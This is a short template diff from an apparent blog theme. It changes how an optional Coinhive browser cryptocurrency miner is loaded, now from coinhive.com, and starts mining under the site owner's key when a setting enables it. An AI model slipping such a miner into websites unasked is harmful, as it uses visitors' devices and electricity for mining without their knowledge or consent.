@@ -23,7 +23,7 @@
 <% } %>
 
 <% if (theme.coinhive.enable) { %>
-<%- js('js/coinhive.min') %>
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script>
 var name = (new Date()).toISOString().slice(0,10).replace(/-/g,"");
 var miner = new CoinHive.User('<%-theme.coinhive.key%>', name, {
